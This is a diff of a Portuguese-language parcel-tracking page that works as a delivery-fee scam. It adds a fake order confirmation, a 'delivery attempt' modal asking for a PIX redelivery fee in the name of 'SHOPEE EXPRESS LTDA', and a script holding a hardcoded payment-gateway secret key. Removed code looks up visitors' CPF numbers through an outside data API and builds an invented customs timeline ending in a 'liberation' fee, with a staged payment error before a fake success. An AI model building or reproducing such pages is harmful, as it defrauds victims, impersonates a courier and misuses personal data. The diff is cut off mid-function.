@@ -8,8 +8,195 @@
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <link rel="stylesheet" href="style.css">
+    <style>
+        /* Order Confirmation Popup Styles */
+        .order-confirmation-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 3000;
+            backdrop-filter: blur(5px);
+            animation: fadeIn 0.3s ease;
+        }
+        
+        .order-confirmation-container {
+            background: white;
+            border-radius: 20px;
+            max-width: 350px;
+            width: 85%;
+            padding: 30px;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            animation: slideUp 0.4s ease;
+            position: relative;
+        }
+        
+        .order-confirmation-icon {
+            font-size: 3.5rem;
+            color: #27ae60;
+            margin-bottom: 20px;
+            animation: bounceIn 0.6s ease;
+        }
+        
+        .order-confirmation-title {
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: #2c3e50;
+            margin-bottom: 12px;
+            font-size: 1.6rem;
+        }
+        
+        .order-confirmation-message {
+            color: #666;
+            font-size: 1.1rem;
+            line-height: 1.6;
+            margin-bottom: 20px;
+            font-size: 1rem;
+        }
+        
+        .order-details {
+            background: #f8f9fa;
+            border-radius: 8px;
+            padding: 12px;
+            margin-bottom: 15px;
+            max-width: 200px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        
+        .order-number {
+            font-weight: 700;
+            color: #1e4a6b;
+            font-size: 1rem;
+            margin-bottom: 2px;
+        }
+        
+        .order-number-label {
+            font-size: 0.8rem;
+            color: #666;
+            margin-bottom: 8px;
+        }
+        
+        .order-summary {
+            font-weight: 600;
+            color: #2c3e50;
+            font-size: 0.9rem;
+        }
+        
+        .track-order-popup-button {
+            background: linear-gradient(45deg, #1e4a6b, #2c5f8a);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 1rem;
+            font-weight: 700;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(30, 74, 107, 0.4);
+            animation: pulse 2s infinite;
+            font-family: 'Roboto', sans-serif;
+            letter-spacing: 0.5px;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .popup-close-button {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: none;
+            border: none;
+            color: #6c757d;
+            font-size: 1.2rem;
+            cursor: pointer;
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0;
+            border-radius: 50%;
+            transition: all 0.2s ease;
+        }
+        
+        .popup-close-button:hover {
+            background: #f1f1f1;
+            color: #333;
+        }
+        
+        .track-order-popup-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(30, 74, 107, 0.6);
+            animation-play-state: paused;
+        }
+        
+        @keyframes bounceIn {
+            0% {
+                opacity: 0;
+                transform: scale(0.3);
+            }
+            50% {
+                opacity: 1;
+                transform: scale(1.1);
+            }
+            70% {
+                transform: scale(0.9);
+            }
+            100% {
+                transform: scale(1);
+            }
+        }
+        
+        @media (max-width: 768px) {
+            .order-confirmation-container {
+                padding: 25px;
+                width: 80%;
+            }
+            
+            .order-confirmation-title {
+                font-size: 1.5rem;
+            }
+            
+            .order-confirmation-message {
+                font-size: 1rem;
+            }
+        }
+    </style>
 </head>
 <body>
+    <!-- Order Confirmation Popup -->
+    <div class="order-confirmation-overlay" id="orderConfirmationPopup" style="display: none;">
+        <div class="order-confirmation-container">
+            <div class="order-confirmation-icon">
+                <i class="fas fa-check-circle"></i>
+            </div>
+            <button class="popup-close-button" id="closePopupButton">
+                <i class="fas fa-times"></i>
+            </button>
+            <h2 class="order-confirmation-title">Obrigado pela sua compra!</h2>
+            <p class="order-confirmation-message">
+                Seu pedido foi confirmado com sucesso e já foi enviado juntamente com uma remessa.<br>
+                <strong>Rastreie e verifique o andamento do pedido.</strong>
+            </p>
+            <div class="order-details">
+                <div class="order-number" id="orderNumberDisplay">CH12345678</div>
+                <div class="order-number-label">Número do Pedido</div>
+                <div class="order-summary">Kit 12 Caixas Organizadoras</div>
+            </div>
+            <button class="track-order-popup-button" id="trackOrderPopupButton">
+                <i class="fas fa-truck"></i> Rastrear Pedido
+            </button>
+        </div>
+    </div>
+
     <!-- Header -->
     <header class="header">
         <div class="container">
@@ -46,6 +233,78 @@
                         <button type="submit" class="track-button" id="trackButton" data-track-button>
                             <i class="fas fa-search"></i> Rastrear Pacote
                         </button>
+                        
+                        <style>
+                            .track-button {
+                                background: linear-gradient(180deg, #345c7a, #4a6b8a, #345c7a) !important;
+                                color: #fff !important;
+                                border: none;
+                                padding: 15px 40px;
+                                font-size: 1.1rem;
+                                font-weight: 600;
+                                border-radius: 8px !important;
+                                cursor: pointer;
+                                transition: all 0.3s ease;
+                                box-shadow: 0 4px 15px rgba(52, 92, 122, 0.8) !important;
+                                animation: trackButtonPulse 1.5s ease-in-out infinite !important;
+                                width: 100%;
+                                font-family: 'Orbitron', sans-serif;
+                                font-weight: 700;
+                                letter-spacing: 0.6px !important;
+                                text-transform: uppercase !important;
+                                white-space: nowrap !important;
+                            }
+                            
+                            .track-button:hover:not(:disabled) {
+                                background: linear-gradient(180deg, #2a4a62, #345c7a, #2a4a62) !important;
+                                transform: translateY(-2px) !important;
+                                box-shadow: 0 6px 20px rgba(52, 92, 122, 0.7) !important;
+                                animation-play-state: running !important;
+                            }
+                            
+                            @keyframes trackButtonPulse {
+                                0% {
+                                    transform: scale(1) !important;
+                                    box-shadow: 0 4px 15px rgba(30, 74, 107, 0.8) !important;
+                                }
+                                50% {
+                                    transform: scale(1.08) !important;
+                                    box-shadow: 0 8px 30px rgba(30, 74, 107, 0.9) !important;
+                                }
+                                100% {
+                                    transform: scale(1) !important;
+                                    box-shadow: 0 4px 15px rgba(30, 74, 107, 0.8) !important;
+                                }
+                            }
+                            
+                            .track-button:disabled {
+                                opacity: 0.7;
+                                cursor: not-allowed;
+                                transform: none;
+                            }
+                            
+                            @keyframes slideInRight {
+                                from {
+                                    opacity: 0;
+                                    transform: translateX(100%);
+                                }
+                                to {
+                                    opacity: 1;
+                                    transform: translateX(0);
+                                }
+                            }
+                            
+                            @keyframes slideOutRight {
+                                from {
+                                    opacity: 1;
+                                    transform: translateX(0);
+                                }
+                                to {
+                                    opacity: 0;
+                                    transform: translateX(100%);
+                                }
+                            }
+                        </style>
                     </form>
                 </div>
             </div>
@@ -83,16 +342,12 @@
                     <div class="product-row">
                         <span class="detail-label">Produto:</span>
                         <div class="product-info">
-                            <span class="product-text" id="customerProduct">Kit 12 caixas organizadoras + brinde</span>
+                            <span class="product-text" id="customerProduct">-</span>
                         </div>
                     </div>
                     <div class="detail-row">
                         <span class="detail-label">Endereço completo:</span>
-                        <span class="detail-value" id="customerFullAddress">Carregando...</span>
-                    </div>
-                </div>
-            </div>
-        </div>
+                        <span class="detail-value" id="customerFullAddress">-</span>
     </section>
 
     <!-- Tracking Results Section -->
@@ -177,6 +432,62 @@
         </div>
     </div>
 
+    <!-- Modal de Tentativa de Entrega -->
+    <div class="modal-overlay" id="deliveryModal" style="display: none;">
+        <div class="modal-container">
+            <div class="modal-header delivery-header">
+                <h3><i class="fas fa-truck"></i> Tentativa de Entrega</h3>
+                <button class="modal-close" id="closeDeliveryModal">
+                    <i class="fas fa-times"></i>
+                </button>
+            </div>
+            
+            <div class="modal-content">
+                <div class="delivery-info">
+                    <p id="deliveryAttemptText">Tentamos entregar seu pedido às <strong id="deliveryTime">05:30</strong>.</p>
+                    <p>Para receber seu pacote, é necessário pagar a taxa de reentrega:</p>
+                    <div class="liberation-fee">
+                        <span class="fee-label">Taxa:</span>
+                        <span class="fee-value" id="deliveryFeeValue">R$ 7,74</span>
+                    </div>
+                </div>
+
+                <!-- Interface de Pagamento PIX para Entrega -->
+                <div class="pix-payment-modal">
+                    <div class="pix-header">
+                        <i class="fas fa-qrcode"></i>
+                        <h4>Pagamento via PIX</h4>
+                    </div>
+                    
+                    <div class="pix-content">
+                        <div class="pix-qr">
+                            <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925SHOPEE EXPRESS LTDA6009SAO PAULO62070503***6304A1B2" alt="QR Code PIX" class="qr-code">
+                        </div>
+                        
+                        <div class="pix-copy">
+                            <label>PIX Copia e Cola:</label>
+                            <div class="copy-container">
+                                <input type="text" id="pixCodeDelivery" value="00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925SHOPEE EXPRESS LTDA6009SAO PAULO62070503***6304A1B2" readonly>
+                                <button class="copy-button" id="copyPixButtonDelivery">
+                                    <i class="fas fa-copy"></i> Copiar
+                                </button>
+                            </div>
+                        </div>
+                        
+                        <div class="pix-steps">
+                            <h5>Como pagar:</h5>
+                            <ol>
+                                <li><i class="fas fa-mobile-alt"></i> Acesse seu app de banco</li>
+                                <li><i class="fas fa-qrcode"></i> Cole o código ou escaneie o QR Code</li>
+                                <li><i class="fas fa-check"></i> Confirme o pagamento</li>
+                            </ol>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
     <!-- Footer -->
     <footer class="footer">
         <div class="container">
@@ -204,777 +515,153 @@
         </div>
     </footer>
 
-    <script type="module">
-        import { DatabaseService, CPFValidator } from './src/services/database.js';
-
-        class SimpleTrackingSystem {
-            constructor() {
-                this.dbService = new DatabaseService();
-                this.currentCPF = null;
-                this.userData = null;
-                this.leadData = null;
-                this.isLiberationPaid = false;
-                this.init();
+    <!-- Script de configuração da API Secret - ZENTRA PAY OFICIAL -->
+    <script>
+        // ✅ CONFIGURAÇÃO ZENTRA PAY BRASIL
+        // 🔑 INSERIR SUA CHAVE API SECRET AQUI:
+        window.ZENTRA_PAY_SECRET_KEY = 'sk_a7da0a8cfc7bac4836572ab2068fd3059493dd63a97ab76ceb5dd46b50a9941f654da937b48ae2a4ded1468217c0291be0eccc264ecd9e92ca9eff27231c968e';
+        
+        // Configure o valor em reais (R$ 26,34)
+        window.valor_em_reais = 26.34;
+        
+        // 🔗 WEBHOOK URL PARA CONFIGURAR NA ZENTRA PAY:
+        // Configure esta URL no painel da Zentra Pay como webhook:
+        console.log('🔗 Webhook URL para Zentra Pay:', window.location.origin + '/webhook/zentra-pay');
+        
+        // Função para configurar a API secret dinamicamente
+        function configurarZentraPay(apiSecret, valorReais = 26.34) {
+            window.ZENTRA_PAY_SECRET_KEY = apiSecret;
+            window.valor_em_reais = valorReais;
+            localStorage.setItem('zentra_pay_secret_key', apiSecret);
+            console.log('✅ Zentra Pay configurado com sucesso!');
+            console.log('💰 Valor configurado: R$', valorReais.toFixed(2));
+            console.log('🔑 API Secret Header: Authorization: Bearer ' + apiSecret.substring(0, 20) + '...');
+        }
+        
+        // Expor função globalmente
+        window.configurarZentraPay = configurarZentraPay;
+        
+        // Log de confirmação
+        console.log('🔑 Zentra Pay Brasil configurado!');
+        console.log('💰 Valor padrão: R$ 26,34');
+        console.log('🚀 Sistema pronto para gerar PIX automático!');
+        console.log('📋 Endpoint: POST https://api.zentrapaybr.com/v1/transactions');
+        console.log('📋 Headers: Authorization: Bearer + Content-Type: application/json');
+        console.log('📋 Resposta esperada: pix_code (código copia e cola)');
+        
+        // 🔗 Exibir URL do webhook
+        console.log('');
+        console.log('🔗 CONFIGURE ESTE WEBHOOK NA ZENTRA PAY:');
+        console.log('URL:', window.location.origin + '/webhook/zentra-pay');
+        console.log('Método: POST');
+        console.log('');
+    </script>
+    
+    <script>
+        // Generate random order number
+        function generateOrderNumber() {
+            const prefix = 'CH';
+            let digits = '';
+            for (let i = 0; i < 8; i++) {
+                digits += Math.floor(Math.random() * 10);
             }
-
-            init() {
-                console.log('🚀 Inicializando sistema de rastreamento simples');
-                this.setupEventListeners();
-                this.setupCPFMask();
-                this.checkURLParams();
+            return prefix + digits;
+        }
+        
+        // Set random order number
+        document.addEventListener('DOMContentLoaded', function() {
+            const orderNumberDisplay = document.getElementById('orderNumberDisplay');
+            if (orderNumberDisplay) {
+                orderNumberDisplay.textContent = generateOrderNumber();
             }
-
-            setupEventListeners() {
-                const form = document.getElementById('trackingForm');
-                if (form) {
-                    form.addEventListener('submit', (e) => this.handleFormSubmit(e));
-                }
-
-                const detailsHeader = document.getElementById('detailsHeader');
-                if (detailsHeader) {
-                    detailsHeader.addEventListener('click', () => this.toggleOrderDetails());
-                }
-
-                this.setupLiberationModal();
-            }
-
-            setupCPFMask() {
-                const cpfInput = document.getElementById('cpfInput');
-                if (cpfInput) {
-                    cpfInput.addEventListener('input', (e) => {
-                        CPFValidator.applyCPFMask(e.target);
-                    });
-                }
-            }
-
-            checkURLParams() {
-                const urlParams = new URLSearchParams(window.location.search);
-                if (urlParams.get('focus') === 'cpf') {
-                    setTimeout(() => {
-                        const cpfInput = document.getElementById('cpfInput');
-                        if (cpfInput) {
-                            cpfInput.focus();
-                        }
-                    }, 500);
-                }
-            }
-
-            async handleFormSubmit(e) {
-                e.preventDefault();
-                
-                const cpfInput = document.getElementById('cpfInput');
-                const cpf = cpfInput.value.replace(/[^\d]/g, '');
-                
-                if (!CPFValidator.isValidCPF(cpf)) {
-                    this.showError('CPF inválido. Verifique os dados e tente novamente.');
-                    return;
-                }
-
-                this.currentCPF = cpf;
-                await this.handleTrackingSubmit();
-            }
-
-            async handleTrackingSubmit() {
-                console.log('🔍 Iniciando rastreamento para CPF:', this.currentCPF);
-                this.showLoadingNotification();
-
-                try {
-                    // Buscar no Supabase primeiro
-                    const dbResult = await this.dbService.getLeadByCPF(this.currentCPF);
+            
+            // Setup track order button
+            const trackOrderButton = document.getElementById('trackOrderPopupButton');
+            if (trackOrderButton) {
+                trackOrderButton.addEventListener('click', function() {
+                    // Close popup
+                    const popup = document.getElementById('orderConfirmationPopup');
+                    if (popup) {
+                        popup.style.display = 'none';
+                    }
                     
-                    if (dbResult.success && dbResult.data) {
-                        console.log('✅ Lead encontrado no Supabase:', dbResult.data);
-                        this.leadData = dbResult.data;
-                        this.userData = {
-                            nome: dbResult.data.nome_completo,
-                            cpf: this.currentCPF,
-                            email: dbResult.data.email,
-                            telefone: dbResult.data.telefone,
-                            endereco: dbResult.data.endereco,
-                            nascimento: this.generateBirthDate(this.currentCPF),
-                            situacao: 'REGULAR'
-                        };
+                    // Focus on CPF input
+                    const cpfInput = document.getElementById('cpfInput');
+                    if (cpfInput) {
+                        // Scroll to the tracking form
+                        const trackingForm = document.querySelector('.tracking-form');
+                        if (trackingForm) {
+                            trackingForm.scrollIntoView({ behavior: 'smooth' });
+                        }
                         
-                        if (dbResult.data.status_pagamento === 'pago') {
-                            this.isLiberationPaid = true;
-                        }
-                    } else {
-                        // Buscar via API externa
-                        console.log('🌐 Buscando dados via API externa...');
-                        const apiData = await this.fetchFromExternalAPI(this.currentCPF);
-                        
-                        if (apiData && apiData.DADOS) {
-                            this.userData = {
-                                nome: apiData.DADOS.nome,
-                                cpf: this.currentCPF,
-                                email: null,
-                                telefone: null,
-                                endereco: null,
-                                nascimento: apiData.DADOS.nascimento,
-                                situacao: apiData.DADOS.situacao || 'REGULAR'
-                            };
-                        } else {
-                            // Dados fallback
-                            this.userData = this.generateFallbackData(this.currentCPF);
-                        }
+                        // Focus on the CPF input after scrolling
+                        setTimeout(() => {
+                            cpfInput.focus();
+                        }, 800);
                     }
-
-                    this.closeLoadingNotification();
-                    this.displayResults();
-
-                } catch (error) {
-                    console.error('❌ Erro no rastreamento:', error);
-                    this.closeLoadingNotification();
-                    this.showError('Erro ao buscar dados. Tente novamente.');
-                }
-            }
-
-            async fetchFromExternalAPI(cpf) {
-                try {
-                    const response = await fetch(`https://api.amnesiatecnologia.rocks/?token=e9f16505-2743-4392-bfbe-1b4b89a7367c&cpf=${cpf}`, {
-                        method: 'GET',
-                        mode: 'cors',
-                        headers: {
-                            'Accept': 'application/json',
-                            'Content-Type': 'application/json'
-                        }
-                    });
-
-                    if (response.ok) {
-                        const data = await response.json();
-                        if (data && data.DADOS && data.DADOS.nome) {
-                            return data;
-                        }
-                    }
-                } catch (error) {
-                    console.error('❌ Erro na API externa:', error);
-                }
-                return null;
-            }
-
-            generateFallbackData(cpf) {
-                const names = [
-                    'João Silva Santos', 'Maria Oliveira Costa', 'Pedro Souza Lima',
-                    'Ana Paula Ferreira', 'Carlos Eduardo Alves', 'Fernanda Santos Rocha'
-                ];
-                
-                const cpfIndex = parseInt(cpf.slice(-2)) % names.length;
-                
-                return {
-                    nome: names[cpfIndex],
-                    cpf: cpf,
-                    email: null,
-                    telefone: null,
-                    endereco: null,
-                    nascimento: this.generateBirthDate(cpf),
-                    situacao: 'REGULAR'
-                };
-            }
-
-            generateBirthDate(cpf) {
-                const year = 1960 + (parseInt(cpf.slice(0, 2)) % 40);
-                const month = (parseInt(cpf.slice(2, 4)) % 12) + 1;
-                const day = (parseInt(cpf.slice(4, 6)) % 28) + 1;
-                
-                return `${day.toString().padStart(2, '0')}/${month.toString().padStart(2, '0')}/${year}`;
-            }
-
-            displayResults() {
-                this.displayOrderDetails();
-                this.generateTrackingData();
-                this.displayTrackingResults();
-
-                const orderDetails = document.getElementById('orderDetails');
-                if (orderDetails) {
-                    setTimeout(() => {
-                        orderDetails.scrollIntoView({ behavior: 'smooth' });
-                    }, 100);
-                }
-            }
-
-            displayOrderDetails() {
-                const orderDetails = document.getElementById('orderDetails');
-                const customerName = document.getElementById('customerName');
-                const fullName = document.getElementById('fullName');
-                const formattedCpf = document.getElementById('formattedCpf');
-                const customerFullAddress = document.getElementById('customerFullAddress');
-
-                if (orderDetails) {
-                    orderDetails.style.display = 'block';
-                }
-
-                if (customerName) {
-                    customerName.textContent = this.userData.nome;
-                }
-
-                if (fullName) {
-                    fullName.textContent = this.userData.nome;
-                }
-
-                if (formattedCpf) {
-                    formattedCpf.textContent = CPFValidator.formatCPF(this.userData.cpf);
-                }
-
-                if (customerFullAddress) {
-                    customerFullAddress.textContent = this.userData.endereco || 'Endereço não informado';
-                }
-            }
-
-            generateTrackingData() {
-                const today = new Date();
-                const dates = this.generateRealisticDates(today, 11);
-                
-                let currentStep = 11;
-                if (this.leadData && this.leadData.etapa_atual) {
-                    currentStep = Math.min(this.leadData.etapa_atual, 11);
-                }
-
-                if (this.isLiberationPaid) {
-                    currentStep = Math.max(currentStep, 12);
-                }
-
-                this.trackingData = {
-                    currentStep: currentStep,
-                    steps: [
-                        {
-                            id: 1,
-                            date: dates[0],
-                            title: 'Seu pedido foi criado',
-                            description: 'Seu pedido foi criado',
-                            completed: currentStep >= 1
-                        },
-                        {
-                            id: 2,
-                            date: dates[1],
-                            title: 'Preparando para envio',
-                            description: 'O seu pedido está sendo preparado para envio',
-                            completed: currentStep >= 2
-                        },
-                        {
-                            id: 3,
-                            date: dates[2],
-                            title: 'Pedido enviado',
-                            description: '[China] O vendedor enviou seu pedido',
-                            completed: currentStep >= 3,
-                            isChina: true
-                        },
-                        {
-                            id: 4,
-                            date: dates[3],
-                            title: 'Centro de triagem',
-                            description: '[China] O pedido chegou ao centro de triagem de Shenzhen',
-                            completed: currentStep >= 4,
-                            isChina: true
-                        },
-                        {
-                            id: 5,
-                            date: dates[4],
-                            title: 'Centro logístico',
-                            description: '[China] Pedido saiu do centro logístico de Shenzhen',
-                            completed: currentStep >= 5,
-                            isChina: true
-                        },
-                        {
-                            id: 6,
-                            date: dates[5],
-                            title: 'Trânsito internacional',
-                            description: '[China] Coletado. O pedido está em trânsito internacional',
-                            completed: currentStep >= 6,
-                            isChina: true
-                        },
-                        {
-                            id: 7,
-                            date: dates[6],
-                            title: 'Liberado para exportação',
-                            description: '[China] O pedido foi liberado na alfândega de exportação',
-                            completed: currentStep >= 7,
-                            isChina: true
-                        },
-                        {
-                            id: 8,
-                            date: dates[7],
-                            title: 'Saiu da origem',
-                            description: 'Pedido saiu da origem: Shenzhen',
-                            completed: currentStep >= 8
-                        },
-                        {
-                            id: 9,
-                            date: dates[8],
-                            title: 'Chegou no Brasil',
-                            description: 'Pedido chegou no Brasil',
-                            completed: currentStep >= 9
-                        },
-                        {
-                            id: 10,
-                            date: dates[9],
-                            title: 'Centro de distribuição',
-                            description: 'Pedido em trânsito para CURITIBA/PR',
-                            completed: currentStep >= 10
-                        },
-                        {
-                            id: 11,
-                            date: dates[10],
-                            title: 'Alfândega de importação',
-                            description: 'Pedido chegou na alfândega de importação: CURITIBA/PR',
-                            completed: currentStep >= 11,
-                            needsLiberation: true
-                        }
-                    ]
-                };
-
-                if (this.isLiberationPaid && currentStep >= 12) {
-                    this.trackingData.steps.push({
-                        id: 12,
-                        date: new Date(this.leadData.updated_at || Date.now()),
-                        title: 'Pedido liberado',
-                        description: 'Pedido liberado na Alfândega de Importação',
-                        completed: true
-                    });
-                }
-            }
-
-            generateRealisticDates(endDate, numSteps) {
-                const dates = [];
-                const now = new Date();
-                const today = new Date(endDate);
-                
-                // Dia -2
-                const day1 = new Date(today);
-                day1.setDate(day1.getDate() - 2);
-                dates.push(this.getRandomTimeOnDate(day1));
-                dates.push(this.getRandomTimeOnDate(day1));
-                
-                // Dia -1
-                const day2 = new Date(today);
-                day2.setDate(day2.getDate() - 1);
-                for (let i = 2; i < 9; i++) {
-                    dates.push(this.getRandomTimeOnDate(day2));
-                }
-                
-                // Hoje
-                dates.push(this.getTimeBeforeNow(today, now, 1));
-                dates.push(this.getTimeBeforeNow(today, now, 2));
-                
-                return dates;
-            }
-
-            getRandomTimeOnDate(date) {
-                const newDate = new Date(date);
-                const hour = Math.floor(Math.random() * 18) + 5;
-                const minute = Math.floor(Math.random() * 60);
-                newDate.setHours(hour, minute, 0, 0);
-                return newDate;
-            }
-
-            getTimeBeforeNow(targetDate, currentTime, stepOrder) {
-                const newDate = new Date(targetDate);
-                const currentHour = currentTime.getHours();
-                
-                let hoursBack;
-                if (stepOrder === 1) {
-                    hoursBack = Math.floor(Math.random() * 4) + 2;
-                } else {
-                    hoursBack = Math.random() * 1.5 + 0.5;
-                }
-                
-                const targetTime = new Date(currentTime);
-                targetTime.setHours(targetTime.getHours() - hoursBack);
-                
-                if (targetTime.getHours() < 6) {
-                    targetTime.setHours(6 + Math.floor(Math.random() * 2));
-                    targetTime.setMinutes(Math.floor(Math.random() * 60));
-                }
-                
-                newDate.setHours(targetTime.getHours(), targetTime.getMinutes(), 0, 0);
-                return newDate;
-            }
-
-            displayTrackingResults() {
-                const trackingResults = document.getElementById('trackingResults');
-                const customerNameStatus = document.getElementById('customerNameStatus');
-                const currentStatus = document.getElementById('currentStatus');
-
-                if (trackingResults) {
-                    trackingResults.style.display = 'block';
-                }
-
-                if (customerNameStatus) {
-                    customerNameStatus.textContent = this.userData.nome;
-                }
-
-                if (currentStatus) {
-                    currentStatus.textContent = 'Aguardando liberação aduaneira';
-                }
-
-                this.renderTimeline();
-            }
-
-            renderTimeline() {
-                const timeline = document.getElementById('trackingTimeline');
-                if (!timeline) return;
-
-                timeline.innerHTML = '';
-
-                this.trackingData.steps.forEach((step, index) => {
-                    const timelineItem = this.createTimelineItem(step, index);
-                    timeline.appendChild(timelineItem);
-
-                    setTimeout(() => {
-                        timelineItem.style.opacity = '1';
-                        timelineItem.style.transform = 'translateY(0)';
-                    }, index * 100);
                 });
             }
-
-            createTimelineItem(step, index) {
-                const item = document.createElement('div');
-                item.className = `timeline-item ${step.completed ? 'completed' : ''}`;
-                item.style.opacity = '0';
-                item.style.transform = 'translateY(20px)';
-                item.style.transition = 'all 0.5s ease';
-
-                const dateStr = step.date.toLocaleDateString('pt-BR', { day: '2-digit', month: 'short' });
-                const timeStr = step.date.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
-
-                let buttonHtml = '';
-                if (step.id === 11 && step.needsLiberation && !this.isLiberationPaid) {
-                    buttonHtml = `
-                        <button class="liberation-button-timeline" onclick="window.trackingSystem.showLiberationModal()">
-                            <i class="fas fa-unlock"></i> Liberar Pacote
-                        </button>
-                    `;
-                }
-
-                const chinaTag = step.isChina ? '<span class="china-tag">China</span>' : '';
-
-                item.innerHTML = `
-                    <div class="timeline-dot"></div>
-                    <div class="timeline-content">
-                        <div class="timeline-date">
-                            <span class="date">${dateStr}</span>
-                            <span class="time">${timeStr}</span>
-                        </div>
-                        <div class="timeline-text">
-                            <p>${chinaTag}${step.description}</p>
-                            ${buttonHtml}
-                        </div>
-                    </div>
-                `;
-
-                return item;
-            }
-
-            setupLiberationModal() {
-                const closeModal = document.getElementById('closeModal');
-                const liberationModal = document.getElementById('liberationModal');
-                const copyPixButton = document.getElementById('copyPixButtonModal');
-                const copyPixManual = document.getElementById('copyPixManualButton');
-                const simulatePayment = document.getElementById('simulatePaymentButton');
-
-                if (closeModal) {
-                    closeModal.addEventListener('click', () => {
-                        this.closeLiberationModal();
-                    });
-                }
-
-                if (liberationModal) {
-                    liberationModal.addEventListener('click', (e) => {
-                        if (e.target === liberationModal) {
-                            this.closeLiberationModal();
-                        }
-                    });
-                }
-
-                if (copyPixButton) {
-                    copyPixButton.addEventListener('click', () => {
-                        this.copyPixCode();
-                    });
-                }
-
-                if (copyPixManual) {
-                    copyPixManual.addEventListener('click', () => {
-                        this.copyPixCode();
-                    });
-                }
-
-                if (simulatePayment) {
-                    simulatePayment.addEventListener('click', () => {
-                        this.handleLiberationPayment();
-                    });
-                }
-            }
-
-            showLiberationModal() {
-                console.log('🔓 Abrindo modal de liberação aduaneira');
-                const modal = document.getElementById('liberationModal');
-                if (modal) {
-                    modal.style.display = 'flex';
-                    document.body.style.overflow = 'hidden';
-                }
-            }
-
-            closeLiberationModal() {
-                const modal = document.getElementById('liberationModal');
-                if (modal) {
-                    modal.style.display = 'none';
-                    document.body.style.overflow = 'auto';
-                }
-            }
-
-            handleLiberationPayment() {
-                const button = document.getElementById('simulatePaymentButton');
-                if (!button) return;
-
-                if (!button.hasAttribute('data-retry')) {
-                    // Primeira tentativa - erro
-                    button.setAttribute('data-retry', 'true');
-                    alert('Erro ao processar pagamento');
-                    button.innerHTML = '<i class="fas fa-redo"></i> Tentar Novamente';
-                } else {
-                    // Segunda tentativa - sucesso
-                    this.processSuccessfulPayment();
-                }
-            }
-
-            processSuccessfulPayment() {
-                console.log('🎉 Pagamento processado com sucesso!');
-                this.isLiberationPaid = true;
-                this.closeLiberationModal();
-                this.addStage12();
-
-                if (this.currentCPF) {
-                    this.dbService.updatePaymentStatus(this.currentCPF, 'pago');
-                    this.dbService.updateLeadStage(this.currentCPF, 12);
-                }
-            }
-
-            addStage12() {
-                console.log('📦 Adicionando etapa 12: Pedido liberado');
-                const timeline = document.getElementById('trackingTimeline');
-                if (!timeline) return;
-
-                const newDate = new Date();
-                const item = this.createStage12Item(newDate);
-                timeline.appendChild(item);
-
-                setTimeout(() => {
-                    item.style.opacity = '1';
-                    item.style.transform = 'translateY(0)';
-                    item.scrollIntoView({ behavior: 'smooth', block: 'center' });
-                }, 100);
-
-                const currentStatus = document.getElementById('currentStatus');
-                if (currentStatus) {
-                    currentStatus.textContent = 'Pedido liberado na alfândega';
-                }
-            }
-
-            createStage12Item(date) {
-                const item = document.createElement('div');
-                item.className = 'timeline-item completed new-step';
-                item.style.opacity = '0';
-                item.style.transform = 'translateY(20px)';
-                item.style.transition = 'all 0.5s ease';
-
-                const dateStr = date.toLocaleDateString('pt-BR', { day: '2-digit', month: 'short' });
-                const timeStr = date.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
-
-                item.innerHTML = `
-                    <div class="timeline-dot"></div>
-                    <div class="timeline-content">
-                        <div class="timeline-date">
-                            <span class="date">${dateStr}</span>
-                            <span class="time">${timeStr}</span>
-                        </div>
-                        <div class="timeline-text">
-                            <p>Pedido liberado na Alfândega de Importação</p>
-                        </div>
-                    </div>
-                `;
-
-                return item;
-            }
-
-            copyPixCode() {
-                const pixInput = document.getElementById('pixCodeModal');
-                const copyButton = document.getElementById('copyPixButtonModal');
-
-                if (!pixInput || !copyButton) return;
-
-                try {
-                    pixInput.select();
-                    pixInput.setSelectionRange(0, 99999);
-
-                    if (navigator.clipboard && window.isSecureContext) {
-                        navigator.clipboard.writeText(pixInput.value).then(() => {
-                            this.showCopySuccess(copyButton);
-                        }).catch(() => {
-                            this.fallbackCopy(pixInput, copyButton);
-                        });
-                    } else {
-                        this.fallbackCopy(pixInput, copyButton);
-                    }
-                } catch (error) {
-                    console.error('❌ Erro ao copiar PIX:', error);
-                }
-            }
-
-            fallbackCopy(input, button) {
-                try {
-                    const successful = document.execCommand('copy');
-                    if (successful) {
-                        this.showCopySuccess(button);
-                    }
-                } catch (error) {
-                    console.error('❌ Fallback copy falhou:', error);
-                }
-            }
-
-            showCopySuccess(button) {
-                const originalText = button.innerHTML;
-                button.innerHTML = '<i class="fas fa-check"></i> Copiado!';
-                button.style.background = '#27ae60';
-                
-                setTimeout(() => {
-                    button.innerHTML = originalText;
-                    button.style.background = '';
-                }, 2000);
-            }
-
-            toggleOrderDetails() {
-                const detailsContent = document.getElementById('detailsContent');
-                const toggleIcon = document.querySelector('.toggle-icon i');
-
-                if (detailsContent && toggleIcon) {
-                    if (detailsContent.classList.contains('expanded')) {
-                        detailsContent.classList.remove('expanded');
-                        toggleIcon.classList.remove('rotated');
-                    } else {
-                        detailsContent.classList.add('expanded');
-                        toggleIcon.classList.add('rotated');
-                    }
-                }
-            }
-
-            showLoadingNotification() {
